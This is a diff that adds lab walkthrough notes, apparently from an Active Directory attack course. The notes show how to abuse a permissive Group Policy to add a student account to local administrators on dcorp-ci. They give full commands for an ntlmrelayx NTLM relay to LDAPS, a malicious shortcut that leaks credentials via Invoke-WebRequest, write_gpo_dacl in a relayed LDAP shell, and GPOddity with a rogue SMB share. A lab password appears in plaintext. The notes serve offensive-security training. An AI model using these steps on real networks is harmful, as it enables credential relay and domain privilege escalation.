@@ -1,0 +1,52 @@
+- Abuse an overly permissive Group Policy to add studentX  to the local administrators group on dcorp-ci.
+	- **If we have permissions to modify a GPO, we can do a lot of interesting things!**
+	- `C:\AD\Tools\PowerView.ps1`
+	- `Get-DomainGPO -Identity 'DevOps Policy'`
+		- The `gpcfilesyspath` property is the one we need to modify.
+		- The `displayname` 'DevOps Policy' is the name of the policy.
+		- We are targeting this because DevOps Admin has permissions over this policy, verifiable using BloodHound.
+	- First we are going to run an NTLM relay attack, using WSL for executing `ntlmrelayx` from the Impacket suite of tools.
+		- `sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.1 --http-port '80,8080' -i --no-smb-server`
+			- We are trying to relay from the LDAP service on the DC (`-t ldaps://172.16.2.1`), to the student VM (`-wh 172.16.100.1`).
+			- Since we don't want to start an SMB server, the relaying is being done on port 80 and 8080.
+			- The WSL sudo password can be found in the lab manual, it is same for all the student VMs.
+		- Once the relaying server is set up, we need to create a shortcut that we will copy over on dcorp-ci and that will connect back to this relaying server that we have started on our student VM.
+			- Create a new shortcut in the `C:\AD\Tools\` directory.
+			- Set the location of the shortcut as the following PowerShell command:
+				- `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.1' -UseDefaultCredentials`'
+				- Save the shortcut with the name "student1".
+		- We need to copy the shortcut we just created to the dcorp-ci machine, where a user simulation will execute it.
+			- `xcopy C:\AD\Tools\student1.lnk \\dcorp-ci\AI`
+		- Once the user simulation executes the malicious shortcut, we should get a connect back at our relaying server.
+		- Now, we should have an interactive ldap shell via TCP on our student machine, authenticated as the `DCORP/DEVOPSADMIN` user.
+			- The `DCORP/DEVOPSADMIN` user has rights over the `DEVOPS POLICY` GPO.
+			- To connect to the ldap shell, we can start a new WSL ubuntu session on our student VM and use `netcat` to connect on the port specified by the `ntlmrelayx` success prompt.
+				- `nc 127.0.0.1:11900`
+			- Now we have two options to add studentX to the local administrators group on dcorp-ci.
+				- Because we already have access to domain user studentX, we can provide studentX `WRITEDACL` permissions on then `DEVOPS POLICY` group policy.
+					- In the ldap shell where we are authenticated as `DCORP/DEVOPSADMIN`, we can execute the following command:
+						- `write_gpo_dacl student1 <policy id, can be determined using "Get-DomainGPO -Identity 'DevOps Policy'" and checking the "name" field>`
+				- If we are operating from a non-domain user or otherwise as well, we can add a computer object and provide that object `WRITEDACL` permissions on the `DEVOPS POLICY` group policy.
+		- Now that studentX has `WRITEDACL` on the `DEVOPS POLICY` group policy, we can terminate the ntlmrelayx process and the ldap shell that we were connected to.
+	- Next we want to use GPOddity to execute the command to add studentX to the local administrators group.
+		- Open a WSL session.
+		- `cd /mnt/c/AD/Tools/GPOddity`
+		- `sudo python3 gpoddity.py --gpo-id '<policy name, can be determined using "Get-DomainGPO -Identity 'DevOps Policy'" and checking the "name" field>' --domain 'dollarcorp.moneycorp.local' --username 'student1' --password 'wBUu9FnyVXe23FsM' --command 'net localgroup administrators student1 /add' --rogue-smbserver-ip '172.16.100.1' --rogue-smb-share 'std1-gp' --dc-ip '172.16.2.1' --smb-node none`
+			- In case we wanted to add a computer object, we would provide the username and password for the computer object instead of the domain user.
+			- The command we want to execute via the GPO creates a GPT that adds the studentX user to the local administrators group.
+			- The rogue SMB server IP is going to be the IP of our student VM.
+			- We can specify the share name here, we would have to create the share as follows for the attack to work:
+				- Run a WSL session.
+				- `cd /mnt/c/AD/Tools/`
+				- `mkdir /mnt/c/AD/Tools/std1-gp`
+				- Whenever we run GPOddity, it provides us with the malicious template in the `GPT_Out` directory, since for the attack the GPO path has to point to the malicious GPT, we will copy it to our SMB share.
+				- `cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std1-gp`
+				- Now we need to run a CMD prompt with administrative privileges, to create the required file share.
+					- `net share std1-gp=C:\AD\Tools\std1-gp`
+					- Next we want to provide everyone with full permissions on the share, so that the domain controller is easily able to access it during the attack, and the Group Policy is able to read the GPT from the share.
+					- `icacls "C:\AD\Tools\std1-gp" /grant Everyone:F /T`
+	- To verify that the attack has worked, we can use the following command to see if the value for the `gpcfilesyspath` property has changed to the directory of the share we created:
+		- `Get-DomainGPO -Identity 'DevOps Policy'`
+		- The GPOs are set to update every couple of minutes, so we might have to wait for a bit of time.
+		- After we have verified that the attack has been executed successfully, we can try logging onto the dcorp-ci machine using winrs, and observe that we can login successfully.
+			- `winrs -r:dcorp-ci cmd /c "set computername && set username"`
